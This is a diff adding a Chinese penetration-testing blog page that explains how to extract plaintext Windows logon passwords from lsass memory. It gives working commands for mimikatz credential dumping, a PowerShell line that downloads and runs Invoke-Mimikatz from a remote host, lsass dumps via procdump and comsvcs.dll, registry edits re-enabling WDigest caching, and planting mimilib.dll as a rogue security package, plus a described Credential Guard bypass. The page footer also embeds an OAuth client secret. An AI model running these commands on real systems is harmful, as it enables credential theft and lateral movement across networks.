@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    Windows系统明文口令获取技术 |
+    
+    Mount4in</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Mount4in" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-Windows系统明文口令获取技术" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Windows系统明文口令获取技术
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2023/04/08/Windows%E7%B3%BB%E7%BB%9F%E6%98%8E%E6%96%87%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96%E6%8A%80%E6%9C%AF/" class="article-date">
+  <time datetime="2023-04-07T23:50:26.000Z" itemprop="datePublished">2023-04-08</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        
+        <p>Windows系统明文口令获取技术总结</p>
+<a id="more"></a>
+
+<h1 id="Windows-系统明文密码获取"><a href="#Windows-系统明文密码获取" class="headerlink" title="Windows 系统明文密码获取"></a>Windows 系统明文密码获取</h1><h2 id="一、背景介绍"><a href="#一、背景介绍" class="headerlink" title="一、背景介绍"></a>一、背景介绍</h2><h3 id="1-1-获取明文密码的意义"><a href="#1-1-获取明文密码的意义" class="headerlink" title="1.1 获取明文密码的意义"></a>1.1 获取明文密码的意义</h3><p>​        内网环境中存在大量同口令的主机，在渗透测试中获取单台主机权限后，可利用该主机口令批量获取内网中多台主机权限，横向移动，扩大战果！</p>
+<h3 id="1-2-获取明文密码的原理"><a href="#1-2-获取明文密码的原理" class="headerlink" title="1.2 获取明文密码的原理"></a>1.2 获取明文密码的原理</h3><p>​        当用户登录后，会把账号密码保存在lsass中，lsass是微软Windows系统的安全机制，它用于本地安全和登录策略，通常我们在登录系统时输入密码之后，密码便会存储在lsass内存中，经过其wdigest和tspkg两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中。</p>
+<p>​        通过dump lsass进程内存，扫描签名得到   加密后的密码和加密密钥进行解密获取明文密码。</p>
+<h2 id="二、攻防对抗的发展"><a href="#二、攻防对抗的发展" class="headerlink" title="二、攻防对抗的发展"></a>二、攻防对抗的发展</h2><h3 id="2-1-第一阶段——Windows-Server-2008-R2及之前"><a href="#2-1-第一阶段——Windows-Server-2008-R2及之前" class="headerlink" title="2.1 第一阶段——Windows Server 2008 R2及之前"></a>2.1 第一阶段——Windows Server 2008 R2及之前</h3><h4 id="（1）介绍"><a href="#（1）介绍" class="headerlink" title="（1）介绍"></a>（1）介绍</h4><p>​         微软无任何防御手段，WDigest凭据缓存默认开启，直接从内存抓取即可。</p>
+<h4 id="（2）方法"><a href="#（2）方法" class="headerlink" title="（2）方法"></a>（2）方法</h4><ol>
+<li><p>方法一：在线获取</p>
+<p>将mimikatz拷贝到目标服务器上，直接运行抓取密码。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug sekurlsa::logonpasswords exit &gt; pass.txt</span><br></pre></td></tr></table></figure>
+
+<p>利用powershell</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="string">"IEX(New-Object System.Net.Webclient).DownloadString('http://10.10.10.128/Powershell/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>方法二：离线获取（优点：目标主机杀软禁止mimikatz时可用）</p>
+<p>① 利用dump工具dump lsass进程内存</p>
+<p>包括如下几个dump工具：</p>
+<ul>
+<li>procdump（微软官方工具）：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">#https:&#x2F;&#x2F;docs.microsoft.com&#x2F;zh-cn&#x2F;sysinternals&#x2F;downloads&#x2F;procdump</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>通过comsvcs.dll的导出函数MiniDump实现dump内存(<strong>comsvcs.dll不需要上传文件</strong>)</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-Procee lsass</span><br><span class="line">rundll32 C:\windows\system32\comsvcs.dll,MiniDump &lt;PID&gt; C:\lsass.dmp full</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在powershell中使用<code>Out-Minidump</code>Dump lsass进程</p>
+</li>
+<li><p>直接使用任务管理器转储文件</p>
+</li>
+<li><p>sqldump：</p>
+</li>
+<li><p>……</p>
+</li>
+</ul>
+<p>②将dmp文件下载在本地利用mimikatz读取密码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit &gt; pass.txt</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h3 id="2-2-第二阶段——Windows-Server-2012-R2-及之后"><a href="#2-2-第二阶段——Windows-Server-2012-R2-及之后" class="headerlink" title="2.2 第二阶段——Windows Server 2012 R2 及之后"></a>2.2 第二阶段——Windows Server 2012 R2 及之后</h3><h4 id="（1）介绍-1"><a href="#（1）介绍-1" class="headerlink" title="（1）介绍"></a>（1）介绍</h4><p>​        微软修改策略，默认禁用WDigest凭据缓存，无法从内存中抓取明文密码.</p>
+<h4 id="（2）方法-1"><a href="#（2）方法-1" class="headerlink" title="（2）方法"></a>（2）方法</h4><h5 id="方法一：UseLogonCredential"><a href="#方法一：UseLogonCredential" class="headerlink" title="方法一：UseLogonCredential"></a>方法一：UseLogonCredential</h5><p>​        微软提供了重新启用WDigest凭据缓存功能的选项，设置了注册表HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDiges</p>
+<p>t\UseLogonCredential，将其从0切换到1会强制WDigest重新缓存凭据，该方法需要修改注册表后用户重新输入密码登录系统。</p>
+<p><strong>具体步骤:</strong></p>
+<p>​        ①使用如下命令修改注册表值：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">修改为记录密码</span></span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br><span class="line"><span class="meta">#</span><span class="bash">修改为不记录密码</span></span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/04/08/Windows%E7%B3%BB%E7%BB%9F%E6%98%8E%E6%96%87%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96%E6%8A%80%E6%9C%AF/image-20230412095909823.png" alt="image-20230412095909823"></p>
+<p>​        ②使用如下命令锁定屏幕：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe user32.dll,LockWorkStation</span><br></pre></td></tr></table></figure>
+
+<p>​        ③抓取密码：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug sekurlsa::logonpasswords exit &gt; pass.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/04/08/Windows%E7%B3%BB%E7%BB%9F%E6%98%8E%E6%96%87%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96%E6%8A%80%E6%9C%AF/image-20230412100027877.png" alt="image-20230412100027877"></p>
+<blockquote>
+<p>使用该方法在如下操作系统可以成功获取明文密码</p>
+<ul>
+<li><strong>Windows Server 2012  R2 6.3.9600</strong>   </li>
+<li><strong>Windows server 2016 1607 10.0.14393</strong></li>
+<li><strong>Windows Server 2019  1809 17763.737</strong></li>
+</ul>
+</blockquote>
+<h5 id="方法二：安全支持提供程序-SSP"><a href="#方法二：安全支持提供程序-SSP" class="headerlink" title="方法二：安全支持提供程序(SSP)"></a>方法二：安全支持提供程序(SSP)</h5><p>​        安全支持提供程序（SSP）是Windows API，用于扩展Windows身份验证机制。lsass进程在Windows启动期间会加载安全支持提供程序DLL，注册表项HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages对应为安全支持提供程序DLL，这就衍生出了相应的攻击思路：第一种思路是删除一个任意的SSP DLL以便于与lsass进程进行交互，第二种思路则是直接伪造一个SSP的dll来提取用户登录时的明文密码。</p>
+<p><strong>具体步骤：</strong></p>
+<p>​        ①复制mimikatz目录下mimilib.dll(区分位数)到C:\Windows\system32目录，然后使用如下命令修改注册表值。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Security Packages" /t REG_MULTI_SZ /d mimilib.dll /f</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/04/08/Windows%E7%B3%BB%E7%BB%9F%E6%98%8E%E6%96%87%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96%E6%8A%80%E6%9C%AF/image-20230412100741027.png" alt="image-20230412100741027"></p>
+<p>​        ②等待系统<strong>重启</strong>后，在C:\Windows\system32目录下生成文件kiwissp.log </p>
+<p><img src="/2023/04/08/Windows%E7%B3%BB%E7%BB%9F%E6%98%8E%E6%96%87%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96%E6%8A%80%E6%9C%AF/image-20230412100932891.png" alt="image-20230412100932891"></p>
+<blockquote>
+<p>运用该原理也有其他的扩展方法，如下：</p>
+<ul>
+<li>mimikatz 的 misc::memssp </li>
+<li>利用AddSecurityPackage API，<strong>不需要重启</strong></li>
+</ul>
+</blockquote>
+<h3 id="2-3-第三阶段——Windows-Defender-Credential-Guard"><a href="#2-3-第三阶段——Windows-Defender-Credential-Guard" class="headerlink" title="2.3 第三阶段——Windows Defender Credential Guard"></a>2.3 第三阶段——Windows Defender Credential Guard</h3><h4 id="（1）介绍-2"><a href="#（1）介绍-2" class="headerlink" title="（1）介绍"></a>（1）介绍</h4><p>​        从 Windows 11 Enterprise, Version 22H2 和 Windows 11 Education, Version 22H 开始，兼容系统默认已启用 Windows Defender Credential Guard。</p>
+<p>​        启用 Windows Defender Credential Guard 后，操作系统中的 LSA 进程与存储和保护这些密钥的新组件（称为隔离的 LSA 进程）进行通信。 独立 LSA 进程存储的数据使用基于虚拟化的安全性进行保护，操作系统的其余部分无法访问。LSA 使用远程过程调用来与隔离的 LSA 进程进行通信。</p>
+<p><img src="/2023/04/08/Windows%E7%B3%BB%E7%BB%9F%E6%98%8E%E6%96%87%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96%E6%8A%80%E6%9C%AF/image-20230412101245449.png" alt="image-20230412101245449"></p>
+<p>​        win10系统可以通过手动启用 Windows Defender Credential Guard，在组策略-&gt;管理-&gt;系统-&gt;Device Guard</p>
+<p><img src="https://user-images.githubusercontent.com/60281035/231117718-d51c6f8a-7e66-47e4-af0e-c037e8d3531c.png" alt="img"></p>
+<p>​        使用如下powershell命令可以检测是否启用 Windows Defender Credential Guard</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_DeviceGuard <span class="literal">-Namespace</span> root\Microsoft\Windows\DeviceGuard).SecurityServicesRunning</span><br></pre></td></tr></table></figure>
+
+<p>​        还可以使用msinfo32.exe查看是否启用 Windows Defender Credential Guard</p>
+<p><img src="https://user-images.githubusercontent.com/60281035/231118022-b14521c5-35ac-4a57-a05b-fe72f15e8418.png" alt="img"></p>
+<h4 id="（2）方法-2"><a href="#（2）方法-2" class="headerlink" title="（2）方法"></a>（2）方法</h4><p>​        使用之前提到的方法均不能获取到明文密码。</p>
+<p>​        g_IsCredGuardEnabled这个全局变量用于保存模块内 Credential Guard 的状态，并决定 Wdigest 后续是否使用 Credential Guard 兼容的功能。取消设置该变量或将其设为0可以绕过 Credential Guard 保护。</p>
+<p>​        利用内存修补方法修改内存中全局变量值g_fParameter_useLogonCredential（同注册表中UseLogonCredential）和g_IsCredGuardEnabled，将在下一次用户输入用户名密码进行身份验证时保存用户的明文密码。</p>
+<p><img src="/2023/04/08/Windows%E7%B3%BB%E7%BB%9F%E6%98%8E%E6%96%87%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96%E6%8A%80%E6%9C%AF/image-20230412101429029.png" alt="image-20230412101429029"></p>
+<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://blog.xpnsec.com/exploring-mimikatz-part-2/" target="_blank" rel="noopener">Exploring Mimikatz - Part 2 - SSP</a></p>
+<p><a href="https://3gstudent.github.io/Mimikatz中SSP的使用" target="_blank" rel="noopener">Mimikatz中SSP的使用 (3gstudent.github.io)</a></p>
+
+      
+    </div>
+  </div>
+  <!-- 要添加的内容 -->
+  
+    <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>作者:  </strong>Mount4in</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>文章链接:  </strong>
+          <a href="/2023/04/08/Windows系统明文口令获取技术/" target="_blank" title="Windows系统明文口令获取技术">http://mount4in.github.io/2023/04/08/Windows系统明文口令获取技术/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明:   </strong>
+            本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            许可协议。转载请注明出处!
+          </li>
+        </ul>
+      <div>
+
+  
+  <!---->
+    <footer class="article-footer">
+      <a data-url="http://mount4in.github.io/2023/04/08/Windows%E7%B3%BB%E7%BB%9F%E6%98%8E%E6%96%87%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96%E6%8A%80%E6%9C%AF/" data-id="clijmhp600001qwuvhjrb3pk7"
+         class="article-share-link">Share</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pentest-win/" rel="tag">pentest,win</a></li></ul>
+
+    </footer>
+
+
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2023/04/13/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94Understanding-and-Mitigating-Remote-Code-Execution-Vulnerabilities-in-Cross-platform-Ecosystem/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            论文笔记--Understanding and Mitigating Remote Code Execution Vulnerabilities in Cross-platform Ecosystem
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2023/04/04/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SerialDetector-Principled-and-Practical-Exploration-of-Object-Injection-Vulnerabilities-for-the-Web/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">论文笔记——SerialDetector: Principled and Practical Exploration of Object Injection Vulnerabilities for the Web</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: 'b7d32ae2538e1a71f462',
+      clientSecret: 'da0452b610458a4ccbc38598fb0d02f0eb9e653d',
+      repo: 'gitalk',
+      owner: 'Mount4in',
+      admin: ['Mount4in'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2023 Mount4in</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="Mount4in"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
